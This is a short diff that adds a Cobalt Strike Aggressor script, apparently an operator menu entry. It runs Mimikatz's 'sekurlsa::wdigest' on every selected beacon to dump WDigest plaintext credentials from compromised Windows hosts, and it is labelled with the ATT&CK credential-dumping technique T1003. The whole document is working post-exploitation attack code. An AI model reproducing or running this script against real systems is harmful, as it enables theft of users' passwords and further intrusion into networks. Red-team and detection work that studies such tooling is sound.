@@ -1,0 +1,13 @@
+item "Mimikatz WDigest Credentials  - T1003"{
+			local('$bid');
+				foreach $bid ($1){
+					wdigest($bid);
+				}
+			}
+			
+			
+sub wdigest{
+
+bmimikatz($1, "sekurlsa::wdigest");
+
+}			
